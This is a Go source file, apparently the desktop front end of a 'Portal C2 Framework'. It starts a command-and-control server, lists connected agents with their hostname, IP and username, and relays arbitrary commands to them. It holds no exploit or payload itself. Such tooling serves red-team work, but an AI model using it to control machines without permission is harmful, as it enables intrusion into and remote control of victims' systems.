package main

import (
	"context"
	"fmt"
	"log"
	"time"

	"portal/pkg/server"
	pb "portal/proto"
)

// App struct
type App struct {
	ctx      context.Context
	c2Server *server.C2Server
}

// NewApp creates a new App application struct
func NewApp() *App {
	return &App{
		c2Server: server.NewC2Server(),
	}
}

// startup is called when the app starts. The context is saved
// so we can call the runtime methods
func (a *App) startup(ctx context.Context) {
	a.ctx = ctx

	// Start C2 server in a goroutine
	go func() {
		addr := "0.0.0.0:50051"
		log.Printf("Starting C2 server on %s", addr)
		if err := a.c2Server.Start(addr); err != nil {
			log.Printf("Server error: %v", err)
		}
	}()
}

// GetAgents returns a list of all connected agents
func (a *App) GetAgents() []map[string]interface{} {
	agentInfos := a.c2Server.GetAgentList()
	result := make([]map[string]interface{}, 0, len(agentInfos))

	for _, agent := range agentInfos {
		result = append(result, map[string]interface{}{
			"id":         agent.AgentId,
			"hostname":   agent.Hostname,
			"os":         agent.Os,
			"arch":       agent.Architecture,
			"ip":         agent.IpAddress,
			"username":   agent.Username,
			"registered": time.Unix(agent.RegistrationTime, 0).Format(time.RFC3339),
		})
	}

	return result
}

// SendCommand sends a command to a specific agent and waits for a response
func (a *App) SendCommand(agentID, commandType string, payload string) string {
	cmdID := fmt.Sprintf("cmd-%d", time.Now().UnixNano())

	cmd := &pb.Command{
		Id:          cmdID,
		CommandType: commandType,
		Payload:     []byte(payload),
		Timestamp:   time.Now().Unix(),
	}

	// Create a channel to receive the response
	respChan := make(chan *pb.CommandResponse, 1)

	// Get the agent
	agent, exists := a.c2Server.GetAgent(agentID)
	if !exists {
		return fmt.Sprintf("Error: Agent %s not found", agentID)
	}

	// Set up a goroutine to listen for the response
	go func() {
		for {
			select {
			case resp := <-agent.Responses:
				if resp.CommandId == cmdID {
					respChan <- resp
					return
				}
			case <-time.After(30 * time.Second):
				// Timeout after 30 seconds
				resp := &pb.CommandResponse{
					CommandId:    cmdID,
					Success:      false,
					Result:       []byte(""),
					ErrorMessage: "Command timed out after 30 seconds",
					Timestamp:    time.Now().Unix(),
				}
				respChan <- resp
				return
			}
		}
	}()

	// Send the command
	err := a.c2Server.SendCommandToAgent(agentID, cmd)
	if err != nil {
		return fmt.Sprintf("Error: %v", err)
	}

	// Wait for the response (with timeout)
	var resp *pb.CommandResponse
	select {
	case resp = <-respChan:
		// Response received
	case <-time.After(35 * time.Second):
		return "Error: Command timed out waiting for response"
	}

	// Format the response
	if !resp.Success {
		return fmt.Sprintf("Error: %s", resp.ErrorMessage)
	}

	return string(resp.Result)
}

// Greet returns a greeting for the given name
func (a *App) Greet(name string) string {
	return fmt.Sprintf("Hello %s, Welcome to the Portal C2 Framework!", name)
}
